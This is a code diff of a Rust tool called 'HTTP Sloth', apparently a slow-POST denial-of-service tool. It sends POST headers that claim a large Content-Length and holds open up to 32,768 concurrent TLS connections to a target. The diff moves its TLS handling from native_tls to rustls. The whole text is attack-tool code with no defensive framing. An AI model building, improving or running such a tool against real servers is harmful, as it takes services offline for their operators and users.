@@ -12,20 +12,17 @@ use clap::{App, Arg};
 #[macro_use]
 extern crate log;
 
-extern crate native_tls;
-
-extern crate tokio;
 use tokio::io::AsyncWriteExt;
 use tokio::net::TcpStream;
 use tokio::time;
 
-extern crate tokio_tls;
+use tokio_rustls::{rustls::ClientConfig, webpki::DNSNameRef, TlsConnector};
 
-extern crate url;
 use url::Url;
 
 #[tokio::main]
 async fn main() -> io::Result<()> {
+    std::env::set_var("RUST_LOG", "info");
     env_logger::init();
 
     let arguments = App::new("HTTP Sloth")
@@ -49,14 +46,13 @@ async fn main() -> io::Result<()> {
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
-    // let scheme = parsed_url.scheme().to_owned();
     let host = parsed_url.host_str().unwrap().to_owned();
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let tick = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
     let max_connections_count: usize =
         value_t!(arguments, "max-connections", usize).unwrap_or(32768);
-    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
+    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, &host, content_length);
     let addr = format!(
         "{}:{}",
         parsed_url.host_str().unwrap(),
@@ -67,8 +63,11 @@ async fn main() -> io::Result<()> {
     .next()
     .unwrap();
 
-    let tls_connector =
-        tokio_tls::TlsConnector::from(native_tls::TlsConnector::builder().build().unwrap());
+    let mut config = ClientConfig::new();
+    config
+        .root_store
+        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
+    let tls_connector = TlsConnector::from(Arc::new(config));
 
     let live_connections = Arc::new(AtomicUsize::new(0));
 
@@ -94,9 +93,9 @@ async fn main() -> io::Result<()> {
         }
 
         let connection_number = live_connections.fetch_add(1, Ordering::SeqCst) + 1;
-        let host = host.clone();
         let start = start.clone();
         let tls_connector = tls_connector.clone();
+        let host = host.clone();
 
         tokio::spawn(async move {
             let socket = TcpStream::connect(&addr).await.map_err(|e| {
@@ -108,7 +107,10 @@ async fn main() -> io::Result<()> {
                 debug!("{}", message);
                 io::Error::new(io::ErrorKind::Other, message)
             })?;
-            let mut connection = tls_connector.connect(&host, socket).await.map_err(|e| {
+
+            let host = host.clone();
+            let dnsname = DNSNameRef::try_from_ascii_str(&host).unwrap();
+            let mut connection = tls_connector.connect(dnsname, socket).await.map_err(|e| {
                 live_connections.fetch_sub(1, Ordering::SeqCst);
                 let message = format!(
                     "ERROR: tokio_tls::TlsConnector.connect: Connection number: {}: {}",
